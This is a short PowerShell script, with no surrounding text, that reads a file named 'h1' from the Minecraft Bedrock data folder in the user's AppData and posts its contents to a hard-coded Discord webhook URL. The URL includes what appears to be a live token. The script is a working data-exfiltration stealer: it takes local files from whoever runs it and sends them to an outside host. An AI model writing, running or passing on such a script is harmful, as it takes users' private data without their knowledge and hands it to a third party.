$file = "AppData\Local\Packages\Microsoft.MinecraftUWP_8wekyb3d8bbwe\LocalState\games\com.mojang\minecraftpe\h1"

$content = Get-Content $file -Raw

$json = @{
    content = $content
} | ConvertTo-Json

$url = "https://discord.com/api/webhooks/1082023903175643178/xa_W-2Uin_fXYV5iKe6ipGGTqqENZY5ZJGEwHiW7MDSHXf9AjMG5pRQiHTAleFAPsEL5"

Invoke-RestMethod -Method Post -Uri $url -Body $json
